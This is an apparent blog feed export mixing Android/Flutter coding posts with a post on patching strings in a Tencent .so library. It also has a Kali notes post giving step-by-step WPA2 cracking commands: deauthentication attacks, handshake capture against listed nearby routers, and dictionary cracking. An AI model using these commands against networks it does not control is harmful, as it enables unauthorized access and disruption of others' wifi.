System.out.println(&quot;改名&quot;+childFile.getName()+&quot;为&quot;+dest.getAbsolutePath()+&quot;是否成功:&quot;+b);</span><br><span class="line"></span><br><span class="line">                        &#125;else&#123;</span><br><span class="line">                            System.out.println(&quot;忽略子文件:&quot;+childFile);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                System.out.println(&quot;忽略文件:&quot;+currentDir);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简书链接:&lt;a href=&quot;https://www.jianshu.com/p/f4f042e00cf6&quot;&gt;关于某bilibli下载器缺陷下载的文件在文件夹子目录修正方法&lt;/a&gt;&lt;br&gt;文章字数：139,阅读全文大约需要1分钟&lt;br&gt;通过下面代码把文件夹的文件以文件夹命名并
      
    
    </summary>
    
      <category term="奇淫技巧" scheme="https://lozn.top/categories/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="奇淫技巧" scheme="https://lozn.top/tags/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>关于通用编程语言字符串流程控制加密的可行性fluttersdk字符串混淆加固</title>
    <link href="https://lozn.top/2022/01/02/%E5%85%B3%E4%BA%8E%E9%80%9A%E7%94%A8%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80-%E5%AD%97%E7%AC%A6%E4%B8%B2-%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8F%AF%E8%A1%8C%E6%80%A7-flutter-sdk%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B7%B7%E6%B7%86-%E5%8A%A0%E5%9B%BA/"/>
    <id>https://lozn.top/2022/01/02/关于通用编程语言-字符串-流程控制加密的可行性-flutter-sdk字符串混淆-加固/</id>
    <published>2022-01-02T04:27:22.000Z</published>
    <updated>2022-06-30T02:06:23.271Z</updated>
    
    <content type="html"><![CDATA[<p>简书链接:<a href="https://www.jianshu.com/p/6c7a2e51a4f6">关于通用编程语言字符串流程控制加密的可行性fluttersdk字符串混淆加固</a><br>文章字数：258,阅读全文大约需要1分钟<br>众所周知, 目前大部分的加固都是基于中间代码进行混淆 处理,<br>但是最终的效果都是实现了,字符串混淆加密, 方法类名重定义,</p><p>但是很少有做基于源码级别的处理.<br>我认为这都是可行的,工具能识别语法,如果能熟悉开发工具sdk 进行研究,我想实现这个万能源码级别的加密更简单一些,它能识别一些语法问题,知道什么名字该混淆什么名字不该混淆.<br>这是我很久以前写的基于源码级别的字符串加密,虽然这个无法和目前基于dex&#x2F;jar过程中的smali代码处理以及asm处理来的简单和方便,但是它同样有他的用处,如果设计的好,可以把它变成兼容,java, python php,swift, kotlin ,dart,c++任意一种语言的字符串加密的实现.<br>从源码级别读取源文件,让他变成加密的代码.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/qssq/StrEncrypt</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简书链接:&lt;a href=&quot;https://www.jianshu.com/p/6c7a2e51a4f6&quot;&gt;关于通用编程语言字符串流程控制加密的可行性fluttersdk字符串混淆加固&lt;/a&gt;&lt;br&gt;文章字数：258,阅读全文大约需要1分钟&lt;br&gt;众所周知, 目前大部分的加
      
    
    </summary>
    
      <category term="跨平台app" scheme="https://lozn.top/categories/%E8%B7%A8%E5%B9%B3%E5%8F%B0app/"/>
    
    
      <category term="跨平台app" scheme="https://lozn.top/tags/%E8%B7%A8%E5%B9%B3%E5%8F%B0app/"/>
    
  </entry>
  
  <entry>
    <title>《将博客搬至CSDN》</title>
    <link href="https://lozn.top/2021/12/26/%E3%80%8A%E5%B0%86%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%87%B3CSDN%E3%80%8B/"/>
    <id>https://lozn.top/2021/12/26/《将博客搬至CSDN》/</id>
    <published>2021-12-26T05:16:48.000Z</published>
    <updated>2022-06-30T02:06:23.267Z</updated>
    
    <content type="html"><![CDATA[<p>简书链接:<a href="https://www.jianshu.com/p/6a11a2fcf6e8">《将博客搬至CSDN》</a><br>文章字数：6,阅读全文大约需要1分钟<br>《将博客搬至CSDN》</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简书链接:&lt;a href=&quot;https://www.jianshu.com/p/6a11a2fcf6e8&quot;&gt;《将博客搬至CSDN》&lt;/a&gt;&lt;br&gt;文章字数：6,阅读全文大约需要1分钟&lt;br&gt;《将博客搬至CSDN》&lt;/p&gt;

      
    
    </summary>
    
      <category term="公告" scheme="https://lozn.top/categories/%E5%85%AC%E5%91%8A/"/>
    
    
      <category term="公告" scheme="https://lozn.top/tags/%E5%85%AC%E5%91%8A/"/>
    
  </entry>
  
  <entry>
    <title>修改so方法</title>
    <link href="https://lozn.top/2021/12/23/%E4%BF%AE%E6%94%B9so%E6%96%B9%E6%B3%95/"/>
    <id>https://lozn.top/2021/12/23/修改so方法/</id>
    <published>2021-12-23T15:25:26.000Z</published>
    <updated>2022-06-30T02:06:23.271Z</updated>
    
    <content type="html"><![CDATA[<p>简书链接:<a href="https://www.jianshu.com/p/50ad3da1d6c9">修改so方法</a><br>文章字数：469,阅读全文大约需要1分钟<br> 首先找到方法<br><a href="https://note.youdao.com/s/1T07L3RG">https://note.youdao.com/s/1T07L3RG</a><br><img src="https://upload-images.jianshu.io/upload_images/2815884-6c5f21245bf63300.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.jpeg"></p><p>例如瞎改这个方法</p><p><img src="https://upload-images.jianshu.io/upload_images/2815884-402f5156faf66f59.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.jpeg"></p><p>里面的所有类包名。</p><p><img src="https://upload-images.jianshu.io/upload_images/2815884-01ce9d586f5be126.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.jpeg"></p><p>双击箭头就进入了字符串常量地址了，</p><p>001CAF5</p><p><img src="https://upload-images.jianshu.io/upload_images/2815884-8d24940936024ed3.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.jpeg"></p><p>可以右击进入编辑模式如果不方便可以选择用其他flex工具，进行跳转地址然后进行</p><p>进行修改，</p><p>我使用 flexhex工具可以复制粘贴。</p><p>比如</p><p><img src="https://upload-images.jianshu.io/upload_images/2815884-d6c296276e737347.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.jpeg"></p><p>复制的时候要复制字符串端，不可以新插入新插入的技术比较难了，最好相等或者比他小。</p><p>这里改成</p><p>复制的时候00 不要复制进行上面就是复制多了导致粘贴的时候后面的无法进行粘贴了。</p><p>“com&#x2F;tencent&#x2F;tenpay&#x2F;cert&#x2F;CertUtil</p><p>tencent&#x2F;com&#x2F;替换为</p><p>qssq666&#x2F;qqq&#x2F;</p><p>以及</p><p>com&#x2F;tencent</p><p>eny.qssq666&#x2F;</p><p>com&#x2F;tenpay&#x2F;cert&#x2F;CertUtil</p><p>tenpay&#x2F;cert</p><p>qssq666&#x2F;cert</p><p>Java_com_tencent_tenpay_cert_CertUtil_set_1token</p><p>com&#x2F;tencent&#x2F;enpay&#x2F;cert&#x2F;CertUtil</p><p>eny&#x2F;qssq666&#x2F;tenpay&#x2F;cert&#x2F;CertUtil</p><p>Java_com_tencent</p><p>替换为</p><p>Java_eny_qssq666</p><p>Java_tencent_com</p><p>替换为</p><p>Java_qssq666_qqq</p><p>Java_com_tenpay_cert</p><p>Java_com_zhengl_cert</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简书链接:&lt;a href=&quot;https://www.jianshu.com/p/50ad3da1d6c9&quot;&gt;修改so方法&lt;/a&gt;&lt;br&gt;文章字数：469,阅读全文大约需要1分钟&lt;br&gt; 首先找到方法&lt;br&gt;&lt;a href=&quot;https://note.youdao.com/s
      
    
    </summary>
    
      <category term="逆向与安全" scheme="https://lozn.top/categories/%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="逆向与安全" scheme="https://lozn.top/tags/%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>原创fluter之个推的插件bug解决</title>
    <link href="https://lozn.top/2021/12/23/%5B%E5%8E%9F%E5%88%9B%5Dfluter%E4%B9%8B%E4%B8%AA%E6%8E%A8%E7%9A%84%E6%8F%92%E4%BB%B6bug%E8%A7%A3%E5%86%B3/"/>
    <id>https://lozn.top/2021/12/23/[原创]fluter之个推的插件bug解决/</id>
    <published>2021-12-23T15:19:45.000Z</published>
    <updated>2022-06-30T02:06:23.247Z</updated>
    
    <content type="html"><![CDATA[<p>简书链接:<a href="https://www.jianshu.com/p/7cfd7ab89d0b">原创fluter之个推的插件bug解决</a><br>文章字数：86,阅读全文大约需要1分钟</p><p>在android app build.gradle中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">apply from: &quot;$flutterRoot/packages/flutter_tools/gradle/flutter.gradle&quot;</span><br></pre></td></tr></table></figure><p>下面加上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> def push_manifestPlaceholders = [</span><br><span class="line">                LOZN_DEBUG:&quot;true&quot;,</span><br><span class="line">                GETUI_APP_ID    : &quot;lozn&quot;,</span><br><span class="line">                GETUI_APP_KEY   : &quot;lozn&quot;,</span><br><span class="line">                GETUI_APP_SECRET: &quot;&quot;,</span><br><span class="line">                // 下面是多厂商配置，如需要开通使用请联系技术支持</span><br><span class="line">                // 如果不需要使用，预留空字段即可</span><br><span class="line">                XIAOMI_APP_ID   : &quot;&quot;,</span><br><span class="line">                XIAOMI_APP_KEY  : &quot;&quot;,</span><br><span class="line">                MEIZU_APP_ID    : &quot;&quot;,</span><br><span class="line">                MEIZU_APP_KEY   : &quot;&quot;,</span><br><span class="line">                HUAWEI_APP_ID   : &quot;&quot;,</span><br><span class="line">                OPPO_APP_KEY   : &quot;&quot;,</span><br><span class="line">                OPPO_APP_SECRET  : &quot;&quot;,</span><br><span class="line">                VIVO_APP_ID   : &quot;&quot;,</span><br><span class="line">                VIVO_APP_KEY  : &quot;&quot;</span><br><span class="line">        ]</span><br><span class="line"> /* project.android &#123;</span><br><span class="line">                defaultConfig &#123;</span><br><span class="line">                    // Setting to android.app.Application is the same as omitting the attribute.</span><br><span class="line">                    manifestPlaceholders =  project.android.defaultConfig.manifestPlaceholders+push_manifestPlaceholders;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; */</span><br><span class="line"> project.android.defaultConfig.manifestPlaceholders= project.android.defaultConfig.manifestPlaceholders+push_manifestPlaceholders</span><br><span class="line">print(&quot;current_manifestplaceholder:&quot;+project.android.defaultConfig.manifestPlaceholders);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果按普通的继承方法,会提示ApplicationName 不存在问题,原因是这样写会把flutter.gradle里面定义的给替换没了.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简书链接:&lt;a href=&quot;https://www.jianshu.com/p/7cfd7ab89d0b&quot;&gt;原创fluter之个推的插件bug解决&lt;/a&gt;&lt;br&gt;文章字数：86,阅读全文大约需要1分钟&lt;/p&gt;
&lt;p&gt;在android app build.gradle中&lt;/p
      
    
    </summary>
    
      <category term="跨平台app" scheme="https://lozn.top/categories/%E8%B7%A8%E5%B9%B3%E5%8F%B0app/"/>
    
    
      <category term="跨平台app" scheme="https://lozn.top/tags/%E8%B7%A8%E5%B9%B3%E5%8F%B0app/"/>
    
  </entry>
  
  <entry>
    <title>android日志超长打印无bug代码</title>
    <link href="https://lozn.top/2021/12/17/android%E6%97%A5%E5%BF%97%E8%B6%85%E9%95%BF%E6%89%93%E5%8D%B0-%E6%97%A0bug%E4%BB%A3%E7%A0%81/"/>
    <id>https://lozn.top/2021/12/17/android日志超长打印-无bug代码/</id>
    <published>2021-12-17T07:37:34.000Z</published>
    <updated>2022-06-30T02:06:23.255Z</updated>
    
    <content type="html"><![CDATA[<p>简书链接:<a href="https://www.jianshu.com/p/7db0be9cb047">android日志超长打印无bug代码</a><br>文章字数：359,阅读全文大约需要1分钟</p><p>网上是用递归写的，会导致出现oom，我用这个while写了一个。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> public static void debug(String TAG,String content) &#123;</span><br><span class="line"></span><br><span class="line">        int startPos = 0;</span><br><span class="line">        int endPos = Math.min(MAX_LENGTH, content.length());</span><br><span class="line">        String current;</span><br><span class="line">//        System.out.println(&quot;startPos:&quot;+startPos+&quot;,endPos:&quot;+endPos+&quot;,totalLen:&quot;+content.length()+&quot;,currentlen：&quot;);</span><br><span class="line">        while (true) &#123;</span><br><span class="line">            current = content.substring(startPos, endPos);</span><br><span class="line"></span><br><span class="line">            startPos = endPos;</span><br><span class="line">            int surplusLen = content.length() -endPos;//current.length();//startPos;</span><br><span class="line">            endPos = startPos+Math.min(MAX_LENGTH, surplusLen);</span><br><span class="line">            System.out.println(&quot;after:&quot; + current+&quot;,startPos:&quot;+startPos+&quot;,endPos:&quot;+endPos+&quot;,totalLen:&quot;+content.length()+&quot;,currentlen：&quot;+current.length());</span><br><span class="line">            System.out.println(TAG+&quot;:&quot;+current);</span><br><span class="line">            if(current.length()&lt;MAX_LENGTH||endPos==current.length()||startPos==endPos)&#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            //不用递归了</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>存在bug的递归写法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 分段打印较长的文本</span><br><span class="line"> *</span><br><span class="line"> * @param tag     标志</span><br><span class="line"> * @param content 内容</span><br><span class="line"> */</span><br><span class="line">public static void debugLarge(String tag, String content ) &#123;</span><br><span class="line">    if (!BuildConfig.DEBUG) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (content.length() &gt; MAX_LENGTH) &#123;</span><br><span class="line">        String part = content.substring(0, MAX_LENGTH);</span><br><span class="line">        Log.d(tag, part);</span><br><span class="line"></span><br><span class="line">        part = content.substring(MAX_LENGTH, content.length());</span><br><span class="line">        if ((content.length() - MAX_LENGTH) &gt; MAX_LENGTH) &#123;</span><br><span class="line">            int pos = 0;</span><br><span class="line">            debugLarge(tag, part);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Log.d(tag, part);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        Log.d(tag, content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>完整用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public class HttpLog implements HttpLoggingInterceptor.Logger &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void log(String message) &#123;</span><br><span class="line">        if (message != null &amp;&amp; message.length() &lt; DebugUtil.MAX_LENGTH) &#123;</span><br><span class="line">            DebugUtil.debug(&quot;HttpLogInfo&quot;, message);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line"></span><br><span class="line">            int keepLen = Math.min((DebugUtil.MAX_LENGTH/2)-30,message.length());</span><br><span class="line">            String start = message.substring(0, keepLen);</span><br><span class="line">            // 取左边 keepLen个  ， 再取右边 keepLen个</span><br><span class="line">            int indexSecond = message.length() - keepLen;</span><br><span class="line">            if(indexSecond&lt;keepLen)&#123;</span><br><span class="line">                indexSecond=Math.min(message.length(),keepLen/2);//如果index的位置到了左边，就直接把右边拿过来。</span><br><span class="line">            &#125;</span><br><span class="line">            String end = message.substring(indexSecond);</span><br><span class="line">            int cutcount = keepLen + indexSecond;//</span><br><span class="line">            DebugUtil.debug(&quot;HttpLogInfo&quot;, start + &quot;|截断了中间&quot; + cutcount + &quot;个字符|&quot; + end);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用了2种截断法，如果是base64的post参数，这打印会导致大量数据，实在不行完全可以做阉割操作。<br>阉割操作可以保证 数据格式头部和尾部基本上完整的，除非多个base64，<br><img src="https://upload-images.jianshu.io/upload_images/2815884-aa9d639780d7327b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简书链接:&lt;a href=&quot;https://www.jianshu.com/p/7db0be9cb047&quot;&gt;android日志超长打印无bug代码&lt;/a&gt;&lt;br&gt;文章字数：359,阅读全文大约需要1分钟&lt;/p&gt;
&lt;p&gt;网上是用递归写的，会导致出现oom，我用这个while写
      
    
    </summary>
    
      <category term="android" scheme="https://lozn.top/categories/android/"/>
    
    
      <category term="android" scheme="https://lozn.top/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>无线渗透之kali笔记</title>
    <link href="https://lozn.top/2021/12/16/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E4%B9%8Bkali%E7%AC%94%E8%AE%B0/"/>
    <id>https://lozn.top/2021/12/16/无线渗透之kali笔记/</id>
    <published>2021-12-16T13:06:07.000Z</published>
    <updated>2022-06-30T02:06:23.279Z</updated>
    
    <content type="html"><![CDATA[<p>简书链接:<a href="https://www.jianshu.com/p/d1edd39f3d2f">无线渗透之kali笔记</a><br>文章字数：1542,阅读全文大约需要6分钟</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D4:EE:07:59:CE:70  -33        5        1    0   8  130   WPA2 CCMP   PSK  CMCC-1024                                                                     </span><br><span class="line">EC:41:18:28:03:40  -66        5        0    0   6  130   WPA2 CCMP   PSK  Xiaomi_033F     </span><br></pre></td></tr></table></figure><p>当前网卡<br> Current MAC:   1c:bf:ce:b6:42:06 (unknown)<br>Permanent MAC: 1c:bf:ce:b6:42:06 (unknown)</p><ul><li>抓握手包<br>airodump-ng -c 4 –bssid  EC:41:18:28:03:40 -w hach wlan0mon</li></ul><p>开启监听模式<br><code>airmon-ng start wlan0 </code><br>查看wifi网卡信息<br><code>iwconfig</code><br>嗅探wifi</p><p><code>airodump-ng wlan0mon</code></p><p>攻击<br><code>aireplay-ng -0 1 –a EC:41:18:28:03:40 -c 08:ED:B9:89:FB:B1 wlan0mon</code></p><ul><li>-0 Deautenticate 冲突模式<br>使已经连接的合法客户端强制断开与路由端的连接，使其重新连接。在重新连接过程中获得验证数据包，从而产生有效 ARP request。<br>如果一个客户端连在路由端上，但是没有人上网以产生有效数据，此时，即使用-3 也无法产生有效 ARP request。所以此时需要用-0 攻击模式配合，-3 攻击才会被立刻激活。<br>aireplay-ng -0 10 –a <ap mac> -c <my mac> wifi0 参数说明：<br>【-0】：冲突攻击模式，后面跟发送次数（设置为 0，则为循环攻击，不停的断开连接，客户端无法正常上网）<br>【-a】：设置 ap 的 mac<br>【-c】：设置已连接的合法客户端的 mac。<br>如果不设置-c，则断开所有和 ap 连接的合法客户端。<br>aireplay-ng -3 -b <ap mac> -h <my mac> wifi0<br>aireplay-ng -3 -b EC:41:18:28:03:40  -h EC:41:18:28:03:40  wifi0</li></ul><p>冲突模式</p><p><code>aireplay-ng -0 10 –a &lt;ap mac&gt; -c &lt;my mac&gt; wifi0   </code></p><p>注：使用此攻击模式的前提是必须有通过认证的合法的客户端连接到路由器</p><ul><li>fake count</li></ul><p><code>aireplay-ng --fakeauth 0 -a EC:41:18:28:03:40 -c 1c:bf:ce:b6:42:06 wlan0mon</code></p><p>查看wifi设备?不可用<br><code>airmon-ng  show wlan device</code></p><p>开始嗅探<br><code>airmon-ng start wlan0</code>网卡将从 wlan0 -&gt;wlan0mon&#96;&#96;&#96;</p><p>扫描wifi<br><code>airodump-ng wlan0mon</code></p><p>抓取握手包 handshake package</p><p>i<code>airodump-ng -c 4 --bssid  EC:41:18:28:03:40 -w hackdir wlan0mon</code><br>跑包tcpdump .cap后缀包</p><p><code>aircrack-ng -2 -b mac_address  dic.txt resouce.cap</code><br>踢用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplya-ng -0 10 -a EC:41:18:28:03:40 -c target-wifi-mac-user wlan0mon</span><br></pre></td></tr></table></figure><p>比如<br><code>aireplay-ng -0 10 -a EC:41:18:28:03:40 -c A2:4E:03:10:C7:73 wlan0mon</code><br>-<code>c</code>是用户的手机mac地址,-a是路由器的mac也就是bssid地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">D4:EE:07:59:CE:70  -39       35       26    0   8  130   WPA2 CCMP   PSK  CMCC-1024                                                                 [0K</span><br><span class="line">EC:41:18:28:03:40  -63       19        0    0   6  130   WPA2 CCMP   PSK  Xiaomi_033F                                                               [0K</span><br><span class="line">6C:38:45:7D:33:BD  -68        4        0    0   6  130   WPA2 CCMP   PSK  ChinaNet-vteT      </span><br></pre></td></tr></table></figure><ul><li>使用wifite<br> enter wifite scan wifi and client?<br>wifite ctrl+c choose number crack, all crack all<br>wifite默认字典<br>vim  &#x2F;usr&#x2F;share&#x2F;dict&#x2F;wordlist-probable.txt</li></ul><p><strong>冲突问题解决</strong><br>在虚拟机重新选择网卡, 或者重启kili或者执行<br> <figure class="highlight plaintext"><figcaption><span>network-manager stop```，以及</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">```airmon-ng check kill```</span><br><span class="line"></span><br><span class="line">**安装hcxdumptool**</span><br><span class="line"></span><br><span class="line">下载源码编译(使用root运行，Linux内核版本&gt;=4.14) https://github.com/ZerBea/hcxdumptool/archive/4.2.0.tar.gz tarf -xvf 4.2.0.tar.gz cd hcxdumptool-4.2.0 make &amp;&amp; make install # 编译完成后的工具均安装在/usr/local/bin/目录下</span><br><span class="line">**hcxtools**</span><br><span class="line"> 安装依赖软件包，解决编译报错 apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev #下载源码编译(使用root运行) wget https://github.com/ZerBea/hcxtools/archive/4.2.0.tar.gz tar -xvf 4.2.0.tar.gz cd hcxtools-4.2.0 make &amp;&amp; make install # 编译完成后的工具均安装在/usr/local/bin/目录下。</span><br><span class="line">除了使用下载方法进行编译外还可以使用进行修改 源编译.</span><br><span class="line"></span><br><span class="line">首先复制下面文本</span><br></pre></td></tr></table></figure><br>#清华大学源<br>deb <a href="http://mirrors.tuna.tsinghua.edu.cn/kali">http://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free<br>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/kali">https://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free<br>#浙江大学源<br>deb <a href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free<br>deb-src <a href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free<br>#官方源<br>#deb <a href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali-rolling main non-free contrib<br>#deb-src <a href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali-rolling main non-free contrib<br>#中科大<br>deb <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib<br>#阿里云<br>#deb <a href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib<br>#deb-src <a href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib<br>#东软大学<br>#deb <a href="http://mirrors.neusoft.edu.cn/kali">http://mirrors.neusoft.edu.cn/kali</a> kali-rolling&#x2F;main non-free contrib<br>#deb-src <a href="http://mirrors.neusoft.edu.cn/kali">http://mirrors.neusoft.edu.cn/kali</a> kali-rolling&#x2F;main non-free contrib<br>#重庆大学<br>#deb <a href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali-rolling main non-free contrib<br>#deb-src <a href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali-rolling main non-free contrib<br>————————————————</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">输入命令</span><br><span class="line">```gedit```到或者```vim /etc/apt/sources.list```</span><br><span class="line">参考链接：https://blog.csdn.net/xsgjm/article/details/105847524</span><br><span class="line"></span><br><span class="line">wifi crack hcxdumptool下载地址</span><br><span class="line">https://github.com/ZerBea/hcxdumptool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">跑字典</span><br><span class="line">```aircrack-ng -w /1.txt /root/use/cap.cap```</span><br><span class="line"></span><br><span class="line">攻击wifi设备的标准步骤</span><br><span class="line">Step 1:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>airodump-ng -c <CH> -bssid <ap_mac_address> -w <wifi-show-name><br>irodump-ng -c 6 -bssid  EC:41:18:28:03:40  -w Xiaomi_033F wlan0mon</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入后你讲看到这2个列,Station列代表的是mac地址,没有的话,要么抓不到,要么是每用户连接</span><br><span class="line">Station:  Frames ,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Step 2:</span><br></pre></td></tr></table></figure><p>aireply-ng -0 10 -a AP_BSSID -C STATION_MAC_ADDRESS<br>10 is attach count, APP_BSSID IS WIFI_MAC_ADDRESS</p><pre><code>STATION_MAC_ADDRESS IS YOU PHONE OR OTHER CLIENT MAC ADDRESSSkali系统更新```apt-get upgrade```             upgrade all soft```apt-get update update``` version info```apt-get dist-upgrade```        update all system跑包其它方法EWSA 5.1.271破包工具 WIFIPR 